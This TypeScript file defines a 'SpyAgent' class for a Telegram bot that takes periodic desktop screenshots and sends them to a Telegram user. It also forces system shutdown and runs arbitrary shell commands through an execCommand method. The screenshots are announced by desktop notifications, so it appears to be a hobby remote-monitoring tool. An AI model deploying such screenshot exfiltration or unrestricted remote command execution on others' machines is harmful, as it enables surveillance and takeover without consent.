import { exec } from "child_process";
import CryptoJS from "crypto-js";
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "fs";
import notifier from "node-notifier";
import os from "os";
import path from "path";
import screenshot from "screenshot-desktop";
import { Context, Telegraf } from "telegraf";
import Image from "../server/models/imgae.model";
import User from "../server/models/user.models";
import { Action, UserData } from "./types";


/**
 * Represents a SpyAgent responsible for interacting with a Telegraf bot,
 * capturing screenshots, and handling various commands and events.
 */
export default class SpyAgent {
    _cacheDir: string;
    _cacheFile: string;
    _bot: Telegraf<Context>;
    _files!: Array<string>;
    cacheFilePath: string;
    cacheDirPath: string;
    intervalId: NodeJS.Timeout | undefined;
    interVal: number;
    userName: string | undefined;
    secretFilePath: string;
    credsFilePath: string;
    notifier: notifier.NodeNotifier;
    user: any;
    icon: string;


    /**
    * Constructor for the SpyAgent class.
    *
    * @param {Telegraf<Context>} bot - The Telegraf bot instance.
    */
    constructor(bot: Telegraf<Context>) {
        this._cacheDir = process.env.CACHE_DIR!;
        this._cacheFile = process.env.CACHE_FILE!;
        this.cacheFilePath = path.join(process.cwd(), this._cacheDir, this._cacheFile);
        this.cacheDirPath = path.join(process.cwd(), this._cacheDir);
        this.secretFilePath = path.join(process.cwd(), process.env.CACHE_DIR!, process.env.SECRET_FILE!)
        this.interVal = Number(process.env.INTERVAL!);
        this._bot = bot;
        this.notifier = notifier;
        this.credsFilePath = path.join(process.cwd(), this._cacheDir, process.env.LOCAL_STORAGE!);
        this.icon = path.join(process.cwd(), 'assets', 'hello.png');
        this.born();
        this.processFiles();
    }


    /**
    * Checks if the SpyAgent is ready by verifying the existence of the bot and user information.
    */
    isReady() {
        if (this._bot && this.userName) return console.log('Spy Agent is ready !');
        else return console.log('Spy Agent is not ready!. Wating for a message to detect the user');
    }

    /**
     * Initializes the SpyAgent by creating necessary directories and files,
     * decrypting the username, and starting the screenshot capture interval.
     */
    async born() {
        if (!existsSync(this.cacheDirPath)) mkdirSync(this.cacheDirPath);
        if (!existsSync(this.cacheFilePath)) writeFileSync(this.cacheFilePath, '[]', 'utf8');
        if (!existsSync(this.secretFilePath)) writeFileSync(this.secretFilePath, '', 'utf8');
        if (!existsSync(this.credsFilePath)) writeFileSync(this.credsFilePath, '{}', 'utf8');
        this._files = JSON.parse(readFileSync(this.cacheFilePath, 'utf8') || '[]');
        this.intervalId = setInterval(() => this.captureScreeShot(), this.interVal);
        const username = readFileSync(path.join(process.cwd(), process.env.CACHE_DIR!, process.env.SECRET_FILE!));
        this.userName = this.decryptUsername(username.toString());
        const userObj = JSON.parse(readFileSync(this.credsFilePath, 'utf-8'));
        if (userObj?.id) {
            const user = await User.findOne({ _id: userObj.id });
            this.user = user;
        }
    }


    /**
     * Performs cleanup operations and stops the screenshot capture interval.
     */
    die() {
        writeFileSync(this.cacheFilePath, JSON.stringify(this._files), 'utf-8');
        writeFileSync(this.credsFilePath, JSON.stringify({ id: this.user?._id }) || '{}');
        clearInterval(this.intervalId);
    }

    /**
     * Sets the username after encrypting it and saving it to a file.
     *
     * @param {string} user - The username to set.
     */
    set setUser(user: string) {
        this.userName = user;
        const encrypted = CryptoJS.AES.encrypt(user, process.env.SECRET_KEY!).toString();
        writeFileSync(path.join(process.cwd(), this._cacheDir, process.env.SECRET_FILE!), encrypted, 'utf8');
    }


    /**
     * Checks if the SpyAgent is in anonymous mode.
     *
     * @returns {boolean} True if the SpyAgent is anonymous, otherwise false.
     */
    isAnonymous(): boolean {
        return this.userName === '' || this.userName === undefined;
    }

    /**
    * Checks if the file queue is empty.
    *
    * @returns {boolean} True if the file queue is empty, otherwise false.
    */
    isEmpty(): boolean {
        return this._files.length === 0;
    }

    /**
     * Gets the first file from the queue.
     *
     * @returns {string} The first file in the queue.
     */
    getFirstFile(): string {
        if (!this.isEmpty()) return this._files[0];
        else return '';
    }

    /**
    * Removes the first file from the queue.
    */
    dequeue(): void {
        if (this.isEmpty()) return console.log('Queue is empty');
        this._files.shift();
    }

    /**
    * Adds a file to the end of the queue.
    *
    * @param {string} fileName - The name of the file to enqueue.
    */
    enqueue(fileName: string): void {
        this._files.push(fileName);
    }


    /**
    * Decrypts the provided username using the secret key.
    *
    * @param {string} user - The encrypted username.
    * @returns {string | undefined} The decrypted username or undefined if not provided.
    */
    decryptUsername(user: string): undefined | string {
        if (!user) return undefined;
        const bytes = CryptoJS.AES.decrypt(user, process.env.SECRET_KEY!);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        return decrypted;
    }

    /**
     * Saves the image chunks to a file and returns the file name.
     *
     * @param {Buffer} chunks - The image chunks to save.
     * @returns {Promise<string>} A promise that resolves with the saved file name.
     */
    imageSaver(chunks: Buffer): Promise<string> {
        return new Promise((resolve, reject) => {
            try {
                const timeStamp = new Date().toISOString().replace(/:/g, '-');
                const filePath = path.join(process.cwd(), process.env.FILE_DIR!, `screenshot-${timeStamp}.png`);
                writeFileSync(filePath, chunks);
                resolve(`screenshot-${timeStamp}.png`);
            }
            catch (err) {
                console.log(err);
                reject(err);
            }
        });
    }


    /**
    * Registers a new user based on the provided user data.
    *
    * @param {UserData} data - The user data to register.
    * @param {Context} ctx - The Telegraf context.
    */
    async registerUser(data: UserData, ctx: Context): Promise<any> {
        try {
            if (this.user?.userId === data.userId) return ctx.reply('You are already registered ');
            if (this?.user?._id) return ctx.reply('You are already registered ');
            const user = new User(data);
            await user.save();
            this.user = user;
            ctx.reply('Successfully registered 👍');
        }
        catch (err) {
            console.log(err);
            ctx.reply('Something went wrong while registering user');
        }
    }


    /**
     * Gets information about the current user.
     *
     * @returns {any | undefined} The user information or undefined if not available.
     */
    getUser() {
        if (this.user) return this.user;
    }


    /**
    * Initiates a system shutdown based on the operating system.
    */
    identify() {
        const platform: string = os.platform();
        switch (platform) {
            case 'win32':
                exec('shutdown /s /f /t 0', { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
                    if (error || stderr) {
                        console.log(error || stderr);
                    }
                    else console.log(stdout);
                });
                break;
            case 'linux':
                exec('shutdown now', (error, stdout) => {
                    if (error) return console.log(error);
                    console.log(stdout);
                });
                break;
            case 'darwin':
                exec('sudo shutdown -h now', (error, stdout) => {
                    if (error) return console.log(error);
                    console.log(stdout);
                });
            default:
                console.log('Unknows os detected');
        }
    }


    /**
    * Executes a system command based on the operating system.
    *
    * @param {string} command - The command to execute.
    */
    async execCommand(command: string) {
        try {
            const platform: string = os.platform();
            switch (platform) {
                case 'win32':
                    exec(command, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
                        if (error || stderr) {
                            console.log(error || stderr);
                        }
                        else console.log(stdout);
                    });
                    break;
                case 'linux':
                    exec(command, (error, stdout) => {
                        if (error) return console.log(error);
                        console.log(stdout);
                    });
                    break;
                case 'darwin':
                    exec(command, (error, stdout) => {
                        if (error) return console.log(error);
                        console.log(stdout);
                    });
            }
        }
        catch (err) {

        }
    }

    /**
     * Notifies the user about a new session and their username.
     *
     * @param {string} name - The username associated with the session.
     */
    whichUser(name: string) {
        this._bot.telegram.sendMessage(this.userName!, `New Session started,Username :${name}`);
    }


    /**
     * Captures a screenshot and saves it to the file system.
     */
    async captureScreeShot(): Promise<void> {
        try {
            const imageDir = path.join(process.cwd(), process.env.FILE_DIR!);
            if (!existsSync(imageDir)) mkdirSync(imageDir);
            if (this.user?.id) {
                screenshot({ format: 'png' })
                    .then(async (img) => {
                        const fileName = await this.imageSaver(img);
                        const image = new Image({ name: fileName, user: this.user.id });
                        await image.save();
                        this.notifier.notify({
                            title: "Screenshot taken 😉",
                            message: "agent007 is on duty 👮",
                            icon: this.icon,
                        });
                        this.enqueue(fileName);
                    })
                    .catch((err: any) => {
                        console.log(err);
                    });
            }
        }
        catch (err) {
            console.log(err);
        }
    }


    /**
     * Handles various actions based on the provided commands.
     *
     * @param {Action} actions - The actions to perform.
     */
    async invinsible(actions: Action) {
        switch (actions.command) {
            case "/peep":
                this.notifier.notify({
                    title: "Helllllo Buddy! ",
                    message: actions.text,
                    icon: this.icon,
                });
                break;
            case "/shutdown":
                this.identify();
                break;
            case "/say":
                this.notifier.notify({
                    title: "Helllllo Buddy! ",
                    message: actions.text,
                    icon: this.icon,
                });
            default:
                console.log('Hu!');

        }
    }


    /**
    * Processes the files in the file queue by sending them to the user.
    */
    async processFiles() {
        try {
            this.isReady();
            while (true) {
                if (!this.isEmpty()) {
                    const file = this.getFirstFile();
                    if (file === '') return;
                    const image = path.join(process.cwd(), process.env.FILE_DIR!, file);
                    await this._bot.telegram.sendPhoto(this.userName!, { source: image });
                    this.dequeue();
                }
                else {
                    await new Promise((r) => setTimeout(r, 5000));
                    continue;
                }
            }
        }
        catch (err) {
            console.log(err);
        }
    }
};